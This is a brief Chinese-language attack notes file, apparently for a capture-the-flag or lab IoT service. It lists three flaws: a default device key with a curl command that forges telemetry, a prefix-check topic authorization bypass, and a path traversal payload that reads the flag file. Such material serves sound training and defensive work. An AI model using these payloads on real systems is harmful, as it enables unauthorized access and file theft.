# 攻击思路

## 默认设备密钥

默认设备密钥为 `device-demo-key`。未修复时可以伪造设备遥测：

```bash
curl -X POST http://target/api/telemetry \
  -H 'Content-Type: application/json' \
  -H 'X-Device-Key: device-demo-key' \
  -d '{"topic":"team1/device-a/status","payload":"owned"}'
```

## Topic 前缀越权

`/api/topic` 使用 `startswith` 判断授权范围。若授权前缀为 `team1/`，需要检查是否能通过相近队伍 ID 或构造 Topic 绕过。

## 固件路径读取

固件接口直接拼接文件名：

```text
/firmware?name=../../flag
```

未修复时可读取动态 Flag。
